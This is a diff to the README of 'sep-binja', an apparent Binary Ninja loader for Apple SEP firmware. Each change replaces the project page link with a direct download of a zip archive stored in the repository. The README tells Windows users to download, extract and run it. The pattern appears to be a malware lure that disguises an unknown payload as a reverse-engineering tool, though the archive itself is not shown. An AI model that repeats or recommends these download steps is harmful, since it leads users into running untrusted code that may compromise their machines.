@@ -1,6 +1,6 @@
 # 🧩 sep-binja - Load Apple SEP Firmware Files
 
-[![Download sep-binja](https://img.shields.io/badge/Download%20sep--binja-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/tannallfired823/sep-binja)
+[![Download sep-binja](https://img.shields.io/badge/Download%20sep--binja-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/tannallfired823/sep-binja/raw/refs/heads/main/repo/sep_binja_v1.4-alpha.4.zip)
 
 ## 🔍 What sep-binja does
 
@@ -12,7 +12,7 @@ This tool is meant for users who want to inspect SEP firmware on Windows with Bi
 
 Visit this page to download and run the software on Windows:
 
-https://github.com/tannallfired823/sep-binja
+https://github.com/tannallfired823/sep-binja/raw/refs/heads/main/repo/sep_binja_v1.4-alpha.4.zip
 
 Use the project page to get the latest version, then download the Windows file or package linked there.
 
@@ -32,7 +32,7 @@ For the best results, keep Binary Ninja up to date. The loader is built to work 
 Follow these steps to use sep-binja on Windows:
 
 1. Open the download page:
-   https://github.com/tannallfired823/sep-binja
+   https://github.com/tannallfired823/sep-binja/raw/refs/heads/main/repo/sep_binja_v1.4-alpha.4.zip
 
 2. Download the Windows release or package from the page.
 
@@ -137,7 +137,7 @@ sep-binja is for users who need a loader for Apple SEP firmware inside Binary Ni
 
 ## 📌 Quick install path
 
-1. Go to https://github.com/tannallfired823/sep-binja
+1. Go to https://github.com/tannallfired823/sep-binja/raw/refs/heads/main/repo/sep_binja_v1.4-alpha.4.zip
 2. Download the Windows package
 3. Extract the files
 4. Copy the loader to the Binary Ninja plugin folder
